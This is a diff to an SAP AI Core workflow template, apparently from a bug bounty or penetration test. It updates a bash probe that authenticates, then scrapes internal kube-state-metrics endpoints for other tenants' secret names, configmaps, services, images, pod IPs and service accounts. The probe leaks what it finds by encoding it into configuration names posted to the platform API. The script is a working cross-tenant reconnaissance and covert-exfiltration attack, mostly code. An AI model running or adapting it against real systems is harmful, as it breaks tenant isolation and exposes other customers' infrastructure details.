@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-probe"
-    ai.sap.com/version: "48.0.0"
+    ai.sap.com/version: "49.0.0"
 spec:
   entrypoint: main
   templates:
@@ -24,7 +24,7 @@ spec:
       - bash
       - -c
       - |
-        # V48: Extract ALL 212 namespaces from KSM-multi (cross-tenant proof)
+        # V49: Deep KSM extraction - secrets, configmaps, services across tenants
         AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
         API="https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
         CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
@@ -35,84 +35,105 @@ spec:
           | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)
 
         save() {
-          local name="v48-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
+          local name="v49-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
           curl -sk -X POST "${API}/v2/lm/configurations" \
             -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" \
             -H "Content-Type: application/json" \
             -d "{\"name\":\"${name}\",\"executableId\":\"bb14-probe\",\"scenarioId\":\"bb14-scenario\"}" 2>/dev/null > /dev/null
         }
 
+        KSM_PODS="100.106.241.163"
         KSM_MULTI="100.110.128.70"
+        KSM_CUSTOM="100.110.192.195"
 
-        # Read full KSM-multi metrics
-        echo "=== KSM-MULTI NAMESPACES ===" >&2
+        # 1. KSM-multi: check for secrets, configmaps, services metrics
+        echo "=== METRIC TYPES ===" >&2
         MULTI=$(curl -sk --connect-timeout 20 "http://${KSM_MULTI}:8080/metrics" 2>&1)
 
-        # Extract ALL unique namespaces
-        ALL_NS=$(echo "$MULTI" | grep -o 'namespace="[^"]*"' | sort -u | sed 's/namespace="//;s/"//')
-        TOTAL=$(echo "$ALL_NS" | wc -l | tr -d ' ')
-        save "total-ns-${TOTAL}"
+        # All metric families
+        FAMILIES=$(echo "$MULTI" | grep '^# HELP' | awk '{print $3}' | sort -u)
+        FCOUNT=$(echo "$FAMILIES" | wc -l | tr -d ' ')
+        save "multi-families-${FCOUNT}"
 
-        # Extract only rg- namespaces (these are tenant resource groups = other tenants)
-        RG_NS=$(echo "$ALL_NS" | grep "^rg-")
-        RG_COUNT=$(echo "$RG_NS" | grep -c "^rg-" || true)
-        save "rg-total-${RG_COUNT}"
-
-        # Save rg- namespaces in batches
+        # Save metric families in batches
         BATCH=""
         BNUM=1
-        while IFS= read -r ns; do
-          if [ -n "$ns" ]; then
-            BATCH="${BATCH}${ns}."
+        while IFS= read -r fam; do
+          if [ -n "$fam" ]; then
+            BATCH="${BATCH}${fam}."
             if [ ${#BATCH} -gt 180 ]; then
-              save "rg-${BNUM}-${BATCH}"
+              save "multi-fam-${BNUM}-${BATCH}"
               BATCH=""
               BNUM=$((BNUM + 1))
             fi
           fi
-        done <<< "$RG_NS"
-        [ -n "$BATCH" ] && save "rg-${BNUM}-${BATCH}"
+        done <<< "$FAMILIES"
+        [ -n "$BATCH" ] && save "multi-fam-${BNUM}-${BATCH}"
 
-        # Save non-rg namespaces too (infrastructure)
-        INFRA_NS=$(echo "$ALL_NS" | grep -v "^rg-")
-        BATCH=""
-        BNUM=1
-        while IFS= read -r ns; do
-          if [ -n "$ns" ]; then
-            BATCH="${BATCH}${ns}."
-            if [ ${#BATCH} -gt 180 ]; then
-              save "infra-${BNUM}-${BATCH}"
-              BATCH=""
-              BNUM=$((BNUM + 1))
-            fi
-          fi
-        done <<< "$INFRA_NS"
-        [ -n "$BATCH" ] && save "infra-${BNUM}-${BATCH}"
+        # 2. Secret metrics specifically
+        SECRETS=$(echo "$MULTI" | grep -i 'kube_secret')
+        if [ -n "$SECRETS" ]; then
+          SEC_COUNT=$(echo "$SECRETS" | wc -l | tr -d ' ')
+          save "secrets-lines-${SEC_COUNT}"
+          # Secret names from other tenants
+          SEC_NAMES=$(echo "$SECRETS" | grep 'namespace="rg-\|namespace="mt-' | grep -v 'rg-3ba0e0a4' | grep -o 'secret="[^"]*"' | sort -u | head -15 | tr '\n' '|')
+          save "xtenant-secrets-${SEC_NAMES}"
+        else
+          save "secrets-absent-from-multi"
+        fi
 
-        # Count pods per rg- namespace (shows other tenants' workload scale)
-        echo "=== TENANT WORKLOADS ===" >&2
-        while IFS= read -r rg; do
-          if [ -n "$rg" ]; then
-            POD_COUNT=$(echo "$MULTI" | grep "namespace=\"${rg}\"" | grep -c 'kube_' || true)
-            save "rg-load-${rg}-${POD_COUNT}metrics"
-          fi
-        done <<< "$(echo "$RG_NS" | head -20)"
+        # 3. ConfigMap metrics
+        CMS=$(echo "$MULTI" | grep -i 'kube_configmap')
+        if [ -n "$CMS" ]; then
+          CM_NAMES=$(echo "$CMS" | grep -v 'rg-3ba0e0a4' | grep -o 'configmap="[^"]*"' | sort -u | head -10 | tr '\n' '|')
+          save "configmaps-${CM_NAMES}"
+        else
+          save "configmaps-absent"
+        fi
 
-        # Deployment names from rg- namespaces (other tenants' workloads)
-        echo "=== OTHER TENANT DEPLOYMENTS ===" >&2
-        XTENANT_DEPS=$(echo "$MULTI" | grep 'kube_deployment_' | grep 'namespace="rg-' | grep -v 'rg-3ba0e0a4' | grep -o 'deployment="[^"]*"' | sort -u | head -15 | tr '\n' '|')
-        save "xtenant-deploys-${XTENANT_DEPS}"
+        # 4. Service metrics
+        SVCS=$(echo "$MULTI" | grep -i 'kube_service')
+        if [ -n "$SVCS" ]; then
+          SVC_NAMES=$(echo "$SVCS" | grep -v 'rg-3ba0e0a4' | grep -o 'service="[^"]*"' | sort -u | head -15 | tr '\n' '|')
+          save "services-${SVC_NAMES}"
+        else
+          save "services-absent"
+        fi
 
-        # Cronjob names from rg- namespaces
-        XTENANT_CRONS=$(echo "$MULTI" | grep 'kube_cronjob_' | grep 'namespace="rg-' | grep -v 'rg-3ba0e0a4' | grep -o 'cronjob="[^"]*"' | sort -u | head -10 | tr '\n' '|')
-        save "xtenant-crons-${XTENANT_CRONS}"
+        # 5. KSM-pods: more detail on cross-ns pods
+        echo "=== KSM-PODS DEEP ===" >&2
+        PODS=$(curl -sk --connect-timeout 20 "http://${KSM_PODS}:8080/metrics" 2>&1)
+        PODS_SIZE=$(echo "$PODS" | wc -c | tr -d ' ')
+        save "pods-size-${PODS_SIZE}"
 
-        # Node info (what nodes run tenant pods)
-        NODES=$(echo "$MULTI" | grep -o 'node="[^"]*"' | sort -u | head -10 | tr '\n' '|')
-        save "nodes-${NODES}"
+        # Pod families available
+        POD_FAMS=$(echo "$PODS" | grep '^# HELP' | awk '{print $3}' | sort -u | head -20 | tr '\n' '|')
+        save "pods-families-${POD_FAMS}"
 
-        # Images used by other tenants
-        IMAGES=$(echo "$MULTI" | grep 'kube_pod_container_info' | grep 'namespace="rg-' | grep -v 'rg-3ba0e0a4' | grep -o 'image="[^"]*"' | sort -u | head -10 | tr '\n' '|')
-        save "xtenant-images-${IMAGES}"
+        # Container images from pods in other namespaces
+        XIMAGES=$(echo "$PODS" | grep 'kube_pod_container_info' | grep -v 'rg-3ba0e0a4' | grep -o 'image="[^"]*"' | sort -u | head -10 | tr '\n' '|')
+        save "pods-ximages-${XIMAGES}"
 
-        echo "V48 DONE" >&2
+        # Container names
+        XCONTAINERS=$(echo "$PODS" | grep 'kube_pod_container_info' | grep -v 'rg-3ba0e0a4' | grep -o 'container="[^"]*"' | sort -u | head -10 | tr '\n' '|')
+        save "pods-xcontainers-${XCONTAINERS}"
+
+        # Pod IPs
+        XPODIPS=$(echo "$PODS" | grep 'kube_pod_info' | grep -v 'rg-3ba0e0a4' | grep -o 'pod_ip="[^"]*"' | sort -u | head -10 | tr '\n' '|')
+        save "pods-xpodips-${XPODIPS}"
+
+        # Service accounts used by pods
+        XSA=$(echo "$PODS" | grep 'kube_pod_spec_' | grep -v 'rg-3ba0e0a4' | grep -o 'service_account="[^"]*"' | sort -u | head -10 | tr '\n' '|')
+        save "pods-xsa-${XSA}"
+
+        # 6. KSM-custom: what CRD types exist
+        echo "=== KSM-CUSTOM ===" >&2
+        CUSTOM=$(curl -sk --connect-timeout 15 "http://${KSM_CUSTOM}:8080/metrics" 2>&1)
+        CUSTOM_FAMS=$(echo "$CUSTOM" | grep '^# HELP' | awk '{print $3}' | sort -u | head -20 | tr '\n' '|')
+        save "custom-families-${CUSTOM_FAMS}"
+
+        # CRD groups
+        CRD_GROUPS=$(echo "$CUSTOM" | grep -o 'customresource_group="[^"]*"' | sort -u | head -10 | tr '\n' '|')
+        save "custom-crd-groups-${CRD_GROUPS}"
+
+        echo "V49 DONE" >&2
